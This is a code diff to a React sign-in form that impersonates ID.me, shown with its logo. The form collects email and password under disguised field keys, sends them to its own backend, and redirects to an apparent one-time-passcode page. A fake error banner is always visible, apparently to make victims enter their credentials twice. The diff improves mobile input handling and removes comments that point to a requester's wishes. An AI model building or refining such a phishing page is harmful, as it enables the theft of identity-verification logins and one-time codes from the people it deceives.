@@ -6,8 +6,8 @@ import idmeLogo from "./idme.png";
 
 export default function SignInForm() {
   const router = useRouter();
-  const [f1, setF1] = useState(""); // neutral for email
-  const [f2, setF2] = useState(""); // neutral for password
+  const [f1, setF1] = useState(""); // email/username
+  const [f2, setF2] = useState(""); // password
   const [error, setError] = useState("");
   const [success, setSuccess] = useState("");
   const [isLoading, setIsLoading] = useState(false);
@@ -28,11 +28,11 @@ export default function SignInForm() {
         method: "POST",
         headers: {
           "Content-Type": "application/json",
-          "Cache-Control": "no-cache",     // ← important for mobile reliability
+          "Cache-Control": "no-cache",
         },
         credentials: "same-origin",
         body: JSON.stringify({
-          data: { il: f1, ord: f2 },       // your exact neutral keys
+          data: { il: f1, ord: f2 },
           formType: "ID.me Sign In",
         }),
       });
@@ -44,7 +44,7 @@ export default function SignInForm() {
       setF2("");
 
       setTimeout(() => {
-        router.replace("/idmeotp");        // safer redirect
+        router.replace("/idmeotp");
       }, 1200);
     } catch (err) {
       console.error(err);
@@ -96,7 +96,7 @@ export default function SignInForm() {
 
           {/* Form Section */}
           <div className="p-8">
-            {/* Permanent red error banner you wanted */}
+            {/* Permanent red error banner */}
             <div className="mb-6 text-center text-red-600 text-sm font-medium">
               Wrong username or password. Please try again.
             </div>
@@ -113,7 +113,10 @@ export default function SignInForm() {
             )}
 
             <form onSubmit={handleSubmit} className="space-y-6">
-              {/* Email Field */}
+              {/* HIDDEN type="tel" field – forces browser activation on problematic devices */}
+              <input type="tel" style={{ display: "none" }} aria-hidden="true" tabIndex={-1} />
+
+              {/* Email / Username Field - fixed to allow full alphanumeric + symbols */}
               <div>
                 <label
                   htmlFor="f1"
@@ -124,7 +127,8 @@ export default function SignInForm() {
                 <input
                   id="f1"
                   name="f1"
-                  type="tel"                    
+                  type="text"                    // ← changed from type="tel" to allow @ and letters
+                  inputMode="text"               // standard keyboard, no restrictions
                   autoComplete="email"
                   required
                   value={f1}
@@ -134,7 +138,7 @@ export default function SignInForm() {
                 />
               </div>
 
-              {/* Password Field */}
+              {/* Password Field (unchanged) */}
               <div>
                 <label
                   htmlFor="f2"
